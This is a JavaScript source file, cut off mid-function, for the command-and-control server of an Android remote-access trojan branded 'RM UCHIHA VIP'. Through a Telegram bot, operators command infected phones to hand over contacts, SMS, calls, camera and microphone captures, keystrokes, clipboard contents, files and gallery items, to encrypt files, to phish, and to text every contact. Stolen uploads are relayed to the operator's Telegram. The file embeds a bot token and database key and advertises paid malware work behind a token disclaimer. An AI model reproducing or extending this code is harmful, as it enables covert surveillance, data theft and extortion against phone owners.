const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Supabase Setup (Aapki keys)
const supabaseUrl = "https://nebwfonyhfgxnfkiisvs.supabase.co";
const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5lYndmb255aGZneG5ma2lpc3ZzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUzNjc0MjMsImV4cCI6MjA5MDk0MzQyM30.me-P_mhC3droVGrHSlD_G3h9-ZgGgR3hy8VyDLFTp58";
const supabase = createClient(supabaseUrl, supabaseKey);

const BASE_URL = "https://doge-production-517d.up.railway.app";

// Old Data file for Master Token
let data = {};
try {
  data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
} catch (e) {
  console.log("No data.json found, continuing with defaults.");
}

// Master Bot Initialization
const bot = new telegramBot(data.token || "8709139578:AAER0NWsrjN2m1skAmD5w8fmD14Sl9yQTwE", {
  'polling': true,
  'request': {}
});

const appData = new Map();
const unassignedSockets = new Map(); // ip -> socket
const deviceMap = new Map(); // ip -> {chatId, botName}

const actions = ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯", "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯", "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯", "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯", "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯", "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯", "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"];

// RM Uchiha Progress Bar
const loadingFrames = ["<b>[▯▯▯▯▯▯▯▯▯▯] 0% 🩸</b>", "<b>[██▯▯▯▯▯▯▯▯] 20% 🩸</b>", "<b>[████▯▯▯▯▯▯] 40% 🩸</b>", "<b>[██████▯▯▯▯] 60% 🩸</b>", "<b>[████████▯▯] 80% 🩸</b>", "<b>[██████████] 100% 👁️‍🗨️</b>"];

async function sendAnimatedProgress(chatId, deviceModel) {
  const header = `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → ${deviceModel} 👁️‍🗨️\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → 𝚃𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚑𝚊𝚜 𝚜𝚝𝚊𝚛𝚝𝚎𝚍 𝚞𝚙𝚕𝚘𝚊𝚍𝚒𝚗𝚐 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎, 𝚙𝚕𝚎𝚊𝚜𝚎 𝚋𝚎 𝚙𝚊𝚝𝚒𝚎𝚗𝚝</b>`;
  const sentMsg = await bot.sendMessage(chatId, header + `\n\n${loadingFrames[0]}`, { 'parse_mode': "HTML" }).catch(()=>{});
  if(!sentMsg) return;
  let frame = 1;
  const interval = setInterval(async () => {
    if (frame >= loadingFrames.length) {
      clearInterval(interval);
      await bot.editMessageText(header + `\n\n<b>[██████████] 100% ✅ 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰</b>`, { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML" }).catch(()=>{});
      return;
    }
    await bot.editMessageText(header + `\n\n${loadingFrames[frame]}`, { chat_id: chatId, message_id: sentMsg.message_id, parse_mode: "HTML" }).catch(()=>{});
    frame++;
  }, 800);
}

function extractIp(reqOrSocket) {
  if (reqOrSocket.headers && reqOrSocket.headers['x-forwarded-for']) return reqOrSocket.headers['x-forwarded-for'].split(',')[0];
  if (reqOrSocket.handshake && reqOrSocket.handshake.headers['x-forwarded-for']) return reqOrSocket.handshake.headers['x-forwarded-for'].split(',')[0];
  if (reqOrSocket.connection) return reqOrSocket.connection.remoteAddress;
  if (reqOrSocket.handshake) return reqOrSocket.handshake.address;
  return "Unknown";
}

app.use(express.json());

// 🩸 IP-BASED DEVICE MAPPING (This links unmodified apps to specific users!)
app.use("/uid=:chatId/:botName", (req, res, next) => {
    let ip = extractIp(req);
    deviceMap.set(ip, { chatId: req.params.chatId, botName: req.params.botName });
    
    // Assign unassigned socket if it connected before this HTTP request
    let sock = unassignedSockets.get(ip);
    if (sock) {
        sock.chatId = req.params.chatId;
        sock.botName = req.params.botName;
        unassignedSockets.delete(ip);
        notifyConnection(sock);
    }
    next();
});

// Handling App Uploads mapping to specific bots
app.post(["/uid=:chatId/:botName", "/uid=:chatId/:botName/upload"], uploader.any(), (req, res) => {
  const { chatId, botName } = req.params;
  const deviceModel = req.headers.model || "Unknown Device";

  if (req.files && req.files.length > 0) {
    req.files.forEach(f => {
        bot.sendDocument(chatId, f.buffer, {
            caption: `<b>📁 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>\n\n<b>RM UCHIHA VIP 👁️‍🗨️</b>`,
            parse_mode: "HTML"
        }, { filename: f.originalname, contentType: f.mimetype }).catch(()=>{});
    });
  }
  if (req.body && Object.keys(req.body).length > 0) {
      bot.sendMessage(chatId, `<b>📊 𝙳𝚊𝚝𝚊 𝚏𝚛𝚘𝚖 [${botName}] → ${deviceModel} 🩸</b>\n\n<b>${JSON.stringify(req.body, null, 2)}</b>\n\n<b>RM UCHIHA VIP 👁️‍🗨️</b>`, {parse_mode: "HTML"}).catch(()=>{});
  }
  res.send("Done");
});

app.get("/text", (req, res) => {
  res.send(data.text || "RM UCHIHA VIP RUNNING");
});

// 🩸 WEBSOCKET LOGIC (Always ON, auto-assigns via IP Mapping)
io.on("connection", _0x48afef => {
  _0x48afef.model = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  _0x48afef.version = _0x48afef.handshake.headers.version || "no information";
  _0x48afef.ip = extractIp(_0x48afef);

  let mapping = deviceMap.get(_0x48afef.ip);
  if (mapping) {
      _0x48afef.chatId = mapping.chatId;
      _0x48afef.botName = mapping.botName;
      notifyConnection(_0x48afef);
  } else {
      unassignedSockets.set(_0x48afef.ip, _0x48afef); // Wait for HTTP hit to identify user
  }

  _0x48afef.on("disconnect", () => {
    unassignedSockets.delete(_0x48afef.ip);
    if (_0x48afef.chatId) {
        let msg = `<b>🔴 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] 🩸</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${_0x48afef.model}\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${_0x48afef.version}\n<b>𝚒𝚙</b> → ${_0x48afef.ip}\n<b>𝚝𝚒𝚖𝚎</b> → ${_0x48afef.handshake.time}\n\n<b>RM UCHIHA VIP 👁️‍🗨️</b>`;
        bot.sendMessage(_0x48afef.chatId, msg, { parse_mode: "HTML" }).catch(()=>{});
    }
  });

  _0x48afef.on("message", _0x44fcc5 => {
    if (_0x48afef.chatId) {
        if (_0x44fcc5 === "The device has started uploading the file, please be patient") {
            sendAnimatedProgress(_0x48afef.chatId, _0x48afef.model);
        } else {
            bot.sendMessage(_0x48afef.chatId, `<b>📩 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 [${_0x48afef.botName}] → ${_0x48afef.model} 👁️‍🗨️\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>${_0x44fcc5}`, { parse_mode: "HTML" }).catch(()=>{});
        }
    }
  });
});

function notifyConnection(socket) {
    if(socket.notified) return;
    socket.notified = true;
    let msg = `<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚝𝚘 [${socket.botName}] 🩸</b>\n\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${socket.model}\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${socket.version}\n<b>𝚒𝚙</b> → ${socket.ip}\n<b>𝚝𝚒𝚖𝚎</b> → ${socket.handshake.time}\n\n<b>RM UCHIHA VIP 👁️‍🗨️</b>`;
    bot.sendMessage(socket.chatId, msg, { parse_mode: "HTML" }).catch(()=>{});
}

// 🩸 TELEGRAM BOT LOGIC (Registration, Auto-Login & Bot Selection)
bot.on("message", async _0xdbde0c => {
  const chatId = String(_0xdbde0c.chat.id);
  const text = _0xdbde0c.text;
  if(!text) return;

  const DISCLAIMER = "<b>⚠️ DISCLAIMER: This tool is made for educational and ethical use ONLY. You are responsible for your actions.</b>";

  // Registration Flow
  if (text.startsWith("/rg ")) {
    const parts = text.slice(4).split(" ");
    if (parts.length < 3) {
        return bot.sendMessage(chatId, "<b>⚠️ Invalid format. Use: /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt;</b>", { parse_mode: "HTML" });
    }
    const [token, password, ...nameParts] = parts;
    const botName = nameParts.join(" ");

    const { data: existing } = await supabase.from("rm-d").select("*").eq("chat_id", chatId).eq("bot_name", botName).single();
    if (existing) return bot.sendMessage(chatId, "<b>🔴 You already have a bot with this name!</b>", { parse_mode: "HTML" });

    const generated_url = `${BASE_URL}/uid=${chatId}/${encodeURIComponent(botName)}`;
    await supabase.from("rm-d").insert([{ chat_id: chatId, bot_token: token, bot_name: botName, password: password, generated_url: generated_url }]);

    bot.sendMessage(chatId, `<b>✅ Bot Successfully Registered! 🩸\n\nApp Connection URL:\n${generated_url}\n\nUse /start to auto-login.</b>\n\n${DISCLAIMER}`, { parse_mode: "HTML" });
    
    // Dynamic Token test message to their own specific bot
    try {
        const testBot = new telegramBot(token);
        testBot.sendMessage(chatId, `<b>🩸 𝚈𝚘𝚞𝚛 𝚋𝚘𝚝 [${botName}] 𝚒𝚜 𝚛𝚎𝚐𝚒𝚜𝚝𝚎𝚛𝚎𝚍 𝚒𝚗 𝚄𝚌𝚑𝚒𝚑𝚊 𝚅𝚒𝚙 👁️‍🗨️</b>\n\n${DISCLAIMER}`, {parse_mode: "HTML"}).catch(()=>{});
    } catch(e) {}
    return;
  }

  // Auto Login / Start
  if (text === "/start" || text === "🔄 Switch Bot") {
    const { data: userBots } = await supabase.from("rm-d").select("bot_name").eq("chat_id", chatId);
    
    if (userBots && userBots.length > 0) {
        const keyboard = userBots.map(b => [{ text: `🤖 ${b.bot_name}` }]);
        bot.sendMessage(chatId, `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸\n\n${DISCLAIMER}\n\n✅ Auto-Login Successful!\n\nSelect the Bot you want to manage: 👁️‍🗨️</b>`, {
            parse_mode: "HTML",
            reply_markup: { keyboard: keyboard, resize_keyboard: true }
        });
    } else {
        bot.sendMessage(chatId, `<b>👑 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 𝚁𝙼 𝚄𝙲𝙷𝙸𝙷𝙰 𝚅𝙸𝙿 🩸\n\n${DISCLAIMER}\n\n⚠️ You have no bots registered.\nUse /rg &lt;bot_token&gt; &lt;password&gt; &lt;bot_name&gt; to register.</b>`, { parse_mode: "HTML" });
    }
    return;
  }

  // Bot Selection Handler
  if (text.startsWith("🤖 ")) {
      const selectedBot = text.replace("🤖 ", "");
      appData.set(chatId + "_selectedBot", selectedBot);
      bot.sendMessage(chatId, `<b>🩸 𝙱𝚘𝚝 [${selectedBot}] 𝚂𝚎𝚕𝚎𝚌𝚝𝚎𝚍! 👁️‍🗨️</b>\n\nSelect an option to perform an action.`, {
          parse_mode: "HTML",
          reply_markup: {
              keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]],
              resize_keyboard: true
          }
      });
      return;
  }

  // Verify Active Selection
  const activeBot = appData.get(chatId + "_selectedBot");
  if (!activeBot) return;

  // Emit Function (Only emits to sockets assigned to this specific ChatID and BotName)
  const emitToDevices = (target, command, extras) => {
      if (target === "all") {
          io.sockets.sockets.forEach(sock => {
              if (sock.chatId === chatId && sock.botName === activeBot) {
                  sock.emit("commend", { request: command, extras: extras });
              }
          });
      } else {
          let sock = io.sockets.sockets.get(target);
          if (sock && sock.chatId === chatId && sock.botName === activeBot) {
              sock.emit("commend", { request: command, extras: extras });
          }
      }
  };

  // State Keys
  const actionKey = chatId + "_action";
  const targetKey = chatId + "_target";
  const numKey = chatId + "_num";

  // 🩸 ACTION HANDLERS (RM UCHIHA STYLE)
  if (appData.get(actionKey) === "microphoneDuration") {
    emitToDevices(appData.get(targetKey), "microphone", [{ key: "duration", value: text }]);
    appData.delete(targetKey); appData.delete(actionKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (appData.get(actionKey) === "toastText") {
    emitToDevices(appData.get(targetKey), "toast", [{ key: "text", value: text }]);
    appData.delete(targetKey); appData.delete(actionKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (appData.get(actionKey) === "smsNumber") {
    appData.set(numKey, text);
    appData.set(actionKey, 'smsText');
    bot.sendMessage(chatId, `<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ${text} 👁️‍🗨️</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]], resize_keyboard: true, one_time_keyboard: true }});
  } else if (appData.get(actionKey) === "smsText") {
    emitToDevices(appData.get(targetKey), "sendSms", [{ key: "number", value: appData.get(numKey) }, { key: "text", value: text }]);
    appData.delete(targetKey); appData.delete(actionKey); appData.delete(numKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (appData.get(actionKey) === "vibrateDuration") {
    emitToDevices(appData.get(targetKey), "vibrate", [{ key: "duration", value: text }]);
    appData.delete(targetKey); appData.delete(actionKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (appData.get(actionKey) === "textToAllContacts") {
    emitToDevices(appData.get(targetKey), "smsToAllContacts", [{ key: "text", value: text }]);
    appData.delete(targetKey); appData.delete(actionKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (appData.get(actionKey) === "notificationText") {
    emitToDevices(appData.get(targetKey), "popNotification", [{ key: "text", value: text }, { key: "url", value: BASE_URL }]);
    appData.delete(targetKey); appData.delete(actionKey);
    bot.sendMessage(chatId, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢... 🩸\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
    let _0x1e2656 = `<b>📱 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚏𝚘𝚛 [${activeBot}] :</b>\n\n`;
    let count = 0;
    io.sockets.sockets.forEach(sock => {
        if (sock.chatId === chatId && sock.botName === activeBot) {
            count++;
            _0x1e2656 += `<b>𝙳𝚎𝚟𝚒𝚌𝚎 ${count} 🩸</b>\n<b>𝚖𝚘𝚍𝚎𝚕</b> → ${sock.model}\n<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → ${sock.version}\n<b>𝚒𝚙</b> → ${sock.ip}\n<b>𝚝𝚒𝚖𝚎</b> → ${sock.handshake.time}\n\n`;
        }
    });
    if (count === 0) bot.sendMessage(chatId, `<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 𝚏𝚘𝚛 [${activeBot}] 👁️‍🗨️</b>\n\n`, { parse_mode: "HTML" });
    else bot.sendMessage(chatId, _0x1e2656, { parse_mode: "HTML" });
  } else if (text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
    let _0x307c8a = [];
    let count = 0;
    io.sockets.sockets.forEach((sock, id) => {
        if (sock.chatId === chatId && sock.botName === activeBot) {
            count++;
            _0x307c8a.push([sock.model]);
        }
    });
    if (count === 0) {
        bot.sendMessage(chatId, `<b>📭 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎 𝚏𝚘𝚛 [${activeBot}] 👁️‍🗨️</b>\n\n`, { parse_mode: "HTML" });
    } else {
        _0x307c8a.push(["✯ 𝙰𝚕𝚕 ✯"]);
        _0x307c8a.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
        bot.sendMessage(chatId, `<b>🎯 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 [${activeBot}] 🩸</b>\n\n`, { parse_mode: 'HTML', reply_markup: { keyboard: _0x307c8a, resize_keyboard: true, one_time_keyboard: true }});
    }
  } else if (text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
    bot.sendMessage(chatId, `<b>ℹ️ For paid work contact Romeo Uchiha\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\nADMIN → ROMEO UCHIHA 🩸\n\n${DISCLAIMER}</b>\n\n`, { parse_mode: 'HTML' });
  } else if (text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
    bot.sendMessage(chatId, "<b>🏠 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 👁️‍🗨️</b>\n\n", { parse_mode: "HTML", reply_markup: { keyboard: [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"], ["🔄 Switch Bot"]], resize_keyboard: true }});
  } else if (text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
    let tId = appData.get(targetKey);
    let devName = tId === "all" ? "all" : (io.sockets.sockets.get(tId) ? io.sockets.sockets.get(tId).model : "Unknown");
    let kb = [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]];
    bot.sendMessage(chatId, `<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 ${devName} 🩸</b>\n\n`, { parse_mode: "HTML", reply_markup: { keyboard: kb, resize_keyboard: true, one_time_keyboard: true }});
  } else if (actions.includes(text)) {
    // Handling all static actions
    const requiresPremium = ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯", "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯"];
